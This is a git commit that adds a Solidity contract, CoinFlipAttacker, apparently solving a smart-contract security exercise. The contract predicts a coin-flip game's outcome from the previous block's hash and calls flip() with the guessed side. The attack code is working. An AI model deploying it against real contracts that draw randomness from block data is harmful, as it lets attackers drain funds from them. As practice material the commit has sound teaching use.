d9ee2306f562486621e13b700dc906c59a034867
Daniel Vichinyan <vichinyan.daniel@gmail.com>
2024-06-05 21:07:44 +0300

    Added the CoinFlipAttacker.sol contract which will perform the attack

---
+++ coinflip/CoinFlipAttacker.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./ICoinFlip.sol";
+
+contract CoinFlipAttacker {
+    address public coinFlipAddress;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlipAddress) {
+        coinFlipAddress = _coinFlipAddress;
+    }
+
+    function attackFlip() public {
+        ICoinFlip coinFlipContract = ICoinFlip(coinFlipAddress);
+
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        coinFlipContract.flip(side);
+    }
+}
